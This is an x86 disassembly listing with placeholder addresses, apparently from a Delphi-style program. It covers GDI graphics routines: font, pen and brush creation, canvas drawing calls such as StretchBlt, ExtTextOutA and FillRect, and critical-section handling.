pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423d5c
xor eax eax
push ebp
push sub_424157
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423d5c
xor eax eax
push ebp
push sub_42413a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423754
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4241d8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424141
mov eax [ ebp - 0x8 ]
call sub_423d6c
retn
mov eax ebx
call sub_42445c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_424478
sub_424188
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423d5c
xor eax eax
push ebp
push sub_4241cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4236dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241d4
mov eax [ ebp - 0x4 ]
call sub_423d6c
retn
sub_4241ec
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_424375
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42437c
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_404188
retn
mov eax [ rw-data ]
call sub_423530
xor eax eax
push ebp
push sub_42434d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42353c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4043c8
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408a68
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_4043c8
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408a68
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4043c8
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_4081e0
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_4244d0
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_424394
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_423f50
mov edx esp
mov eax ebx
call sub_424188
add esp 0x2c
pop esi
pop ebx
retn
sub_4243c0
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424170
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_424188
add esp 0x2c
pop esi
pop ebx
retn
sub_424400
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_424170
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402d24
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404400
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402c14
mov edx esp
mov eax ebx
call sub_424188
sub_424478
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_4243c0
pop esi
pop ebx
retn
sub_4244a4
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_424170
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_424188
add esp 0x30
pop ebx
retn
sub_4244d8
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424170
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_424188
add esp 0x2c
pop esi
pop ebx
retn
sub_424508
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424170
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_424188
add esp 0x2c
pop esi
pop ebx
retn
sub_424530
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423548
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_424574
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_42362c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_42459c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418eb4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423d5c
xor eax eax
push ebp
push sub_42463b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423d5c
xor eax eax
push ebp
push sub_42461e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423754
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_424784
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424625
mov eax [ ebp - 0x8 ]
call sub_423d6c
retn
sub_424654
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_42466c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423d5c
xor eax eax
push ebp
push sub_4246b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4236dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4246b8
mov eax [ ebp - 0x4 ]
call sub_423d6c
retn
sub_4246c4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424654
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_42466c
add esp 0x10
pop esi
pop ebx
retn
sub_4246ec
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_423530
xor eax eax
push ebp
push sub_424772
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42353c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423d18
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_4247a0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424654
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_42466c
add esp 0x10
pop esi
pop ebx
retn
sub_4247d0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_424654
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_42466c
sub_4247fc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423548
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_42483c
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_42362c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_424864
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418eb4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423d5c
xor eax eax
push ebp
push sub_4248f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423d5c
xor eax eax
push ebp
push sub_4248d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423754
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4248de
mov eax [ ebp - 0x8 ]
call sub_423d6c
retn
sub_42490c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_424928
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423d5c
xor eax eax
push ebp
push sub_42496d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4236dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424974
mov eax [ ebp - 0x4 ]
call sub_423d6c
retn
sub_424978
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_424928
add esp 0x10
pop edi
pop esi
retn
sub_4249a4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_42490c
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_424928
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_4249d8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_423530
xor edx edx
push ebp
push sub_424aa5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42353c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423d18
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_424ac0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_42490c
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_424928
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_424af4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403338
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_424004
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4253b4
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424530
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4253d4
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4247fc
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4253f4
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_418bdc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_424bb8
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_418c78
xor edx edx
mov eax esi
call sub_4251ec
mov eax [ esi + 0xc ]
call sub_403368
mov eax [ esi + 0x10 ]
call sub_403368
mov eax [ esi + 0x14 ]
call sub_403368
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418e88
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_424c14
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425240
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_425240
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_424c9c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425240
mov eax [ ebx + 0x14 ]
call sub_42499c
call sub_423d18
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423d18
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_417264
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_424d48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425240
mov eax [ ebx + 0x14 ]
call sub_4249d8
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_424d84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425240
mov eax [ ebx + 0x14 ]
call sub_4249d8
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_424dc0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425240
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_424e20
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425240
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_424e4c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425240
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_424e94
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425240
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_424ed0
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_42516c
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_424efc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425240
mov eax ebx
call sub_424ed0
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_404424
push eax
mov eax esi
call sub_404624
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_424fcc
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_424e20
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_424fcc
inc eax
add edi eax
sub_424f88
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425240
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_404424
push eax
mov eax edi
call sub_404624
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_424fcc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_424f88
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_424fe8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_424f88
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_425008
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_425054
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42505b
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_424df8
sub_4250b4
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425240
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_4250d8
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_424e20
pop ecx
pop edx
pop edi
pop esi
retn
sub_4250f8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425240
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_425124
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425240
mov eax [ ebp + 0x8 ]
call sub_423d18
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_42518c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_4251ec
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_42518c
mov edx esp
mov eax ebx
call sub_4250b4
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_4250d8
sub_425240
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_4252dc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
test bl 0x8
je r-xdata
mov eax esi
call sub_425308
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_425338
sub_4252dc
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_4241ec
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423d18
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_425308
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4246ec
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_425338
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_4249d8
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_4249d8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_424ab8
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_42499c
call sub_423d18
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
